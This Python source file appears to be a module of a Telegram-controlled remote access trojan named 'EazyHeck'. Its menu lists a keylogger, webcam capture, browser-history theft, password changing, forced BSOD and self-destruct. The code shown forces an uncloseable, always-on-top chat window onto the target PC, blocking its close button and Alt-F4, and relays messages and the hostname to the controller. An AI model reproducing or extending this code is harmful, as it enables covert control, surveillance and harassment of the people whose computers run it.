from aiogram import Router
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import asyncio, threading, sys, socket

router = Router()

chat_state = {
    "active": False,
    "bot": None,
    "chat_id": None,
    "window": None,
    "pc_name": None,
    "user_name": None,
    "connect_count": 0,
}

MENU_BUTTONS = {
    "📸 Скриншот", "💻 Система", "⚙️ Команда", "📁 Файлы",
    "🔧 Процессы", "🔊 Громкость", "🔴 Запись экрана", "📋 Буфер",
    "🔔 Уведомление", "⏻ Питание", "📷 Вебкамера", "🌐 Открыть URL",
    "🔑 Кейлоггер", "🖱 Управление мышью", "🔌 Wi-Fi сети", "⏰ Планировщик",
    "📡 Интернет", "🎵 Медиа", "📺 Дисплей", "🔐 Автозапуск",
    "📦 Программы", "🌐 История браузера", "🎨 Обои",
    "🖱 Поменять кнопки мыши", "💬 Чат с ПК", "🔑 Сменить пароль",
    "💥 BSOD", "🔒 Блокировка", "💣 Самоуничтожение",
}

chat_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="❌ Завершить чат", callback_data="chat_close", style="danger")]
])

class ChatNameState(StatesGroup):
    waiting_name = State()

class ChatWindow:
    def __init__(self, bot, chat_id, loop, user_name, pc_name):
        self.bot = bot
        self.chat_id = chat_id
        self.loop = loop
        self.user_name = user_name  # имя того кто управляет (из тг)
        self.pc_name = pc_name      # имя компа
        self.root = None
        self.text_area = None

    def close(self):
        if self.root:
            try:
                self.root.after(0, self.root.destroy)
            except Exception:
                pass
            self.root = None

    def add_incoming(self, text):
        # Сообщение от управляющего (из тг) — показываем его имя
        if self.root and self.text_area:
            self.root.after(0, lambda t=text: self._insert(f"[{self.user_name}]: {t}\n"))

    def _insert(self, text):
        self.text_area.config(state="normal")
        self.text_area.insert("end", text)
        self.text_area.config(state="disabled")
        self.text_area.see("end")

    def close(self):
        if self.root:
            try:
                self.root.after(0, self.root.destroy)
            except Exception:
                pass
            self.root = None

    def run(self):
        import tkinter as tk
        self.root = tk.Tk()
        self.root.title(f"EazyHeck — {self.pc_name}")
        self.root.geometry("420x520")
        self.root.configure(bg="#1e1e1e")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.attributes("-topmost", True)

        tk.Label(self.root, text=f"EazyHeck — {self.pc_name}",
                 bg="#1e1e1e", fg="#666", font=("Consolas", 9)).pack(pady=(6, 0))

        self.text_area = tk.Text(self.root, state="disabled", bg="#2b2b2b", fg="white",
                                  font=("Consolas", 11), relief="flat", padx=8, pady=8)
        self.text_area.pack(fill="both", expand=True, padx=8, pady=6)

        entry_frame = tk.Frame(self.root, bg="#1e1e1e")
        entry_frame.pack(fill="x", padx=8, pady=(0, 10))

        entry = tk.Entry(entry_frame, bg="#2b2b2b", fg="white", insertbackground="white",
                         font=("Consolas", 11), relief="flat")
        entry.pack(side="left", fill="x", expand=True, ipady=6)
        entry.focus()

        def send():
            text = entry.get().strip()
            if not text:
                return
            entry.delete(0, "end")
            # Сообщение от ПК — показываем имя компа
            self._insert(f"[{self.pc_name}]: {text}\n")
            asyncio.run_coroutine_threadsafe(
                self.bot.send_message(self.chat_id, f"💻 <b>{self.pc_name}:</b> {text}"),
                self.loop
            )

        entry.bind("<Return>", lambda e: send())
        tk.Button(entry_frame, text="➤", command=send, bg="#0088cc", fg="white",
                  font=("Consolas", 11, "bold"), relief="flat", padx=10).pack(side="right", padx=(4, 0))

        self.root.mainloop()

def get_pc_name():
    try:
        return socket.gethostname()
    except Exception:
        return "UNKNOWN-PC"

def is_chat_message(m: Message) -> bool:
    return (
        chat_state["active"]
        and bool(m.text)
        and not m.text.startswith("/")
        and m.text not in MENU_BUTTONS
    )

@router.message(lambda m: m.text == "💬 Чат с ПК")
async def start_chat(message: Message, state: FSMContext):
    if chat_state["active"]:
        await message.answer("💬 Чат уже активен!\n/stopchat — закрыть")
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⏭ Пропустить (Аноним)", callback_data="chat_skip")]
    ])
    await message.answer(
        "💬 Введи своё имя которое увидит пользователь за ПК:",
        reply_markup=kb
    )
    await state.set_state(ChatNameState.waiting_name)

@router.callback_query(lambda c: c.data == "chat_skip")
async def chat_skip_name(callback: CallbackQuery, state: FSMContext, bot):
    await state.clear()
    await callback.answer()
    await _open_chat(callback.message, bot, callback.message.chat.id, "Аноним")

@router.message(ChatNameState.waiting_name)
async def chat_set_name(message: Message, state: FSMContext, bot):
    name = message.text.strip() or "Аноним"
    await state.clear()
    await _open_chat(message, bot, message.chat.id, name)

async def _open_chat(message, bot, chat_id, user_name):
    pc_name = get_pc_name()
    loop = asyncio.get_event_loop()
    window = ChatWindow(bot, chat_id, loop, user_name, pc_name)
    chat_state.update({
        "active": True, "bot": bot, "chat_id": chat_id,
        "window": window, "pc_name": pc_name, "user_name": user_name,
    })
    threading.Thread(target=window.run, daemon=True).start()
    await message.answer(
        f"💬 <b>Чат открыт</b>\n\nПользователь видит тебя как: <b>{user_name}</b>\nПК: <b>{pc_name}</b>",
        reply_markup=chat_kb
    )

@router.message(lambda m: m.text == "/stopchat")
async def stop_chat(message: Message):
    if not chat_state["active"]:
        await message.answer("❌ Чат не активен")
        return
    chat_state["active"] = False
    window = chat_state.get("window")
    if window:
        window.close()
    pc_name = chat_state.get("pc_name", "ПК")
    await message.answer(f"🔌 <b>{pc_name}</b> — соединение потеряно.")

@router.callback_query(lambda c: c.data == "chat_close")
async def close_chat_cb(callback: CallbackQuery):
    chat_state["active"] = False
    window = chat_state.get("window")
    if window:
        window.close()
    pc_name = chat_state.get("pc_name", "ПК")
    await callback.message.edit_text(f"🔌 <b>{pc_name}</b> — соединение потеряно.")
    await callback.answer()

@router.message(is_chat_message)
async def forward_to_pc(message: Message):
    window = chat_state.get("window")
    if window:
        window.add_incoming(message.text)
    await message.answer("✅ Доставлено")
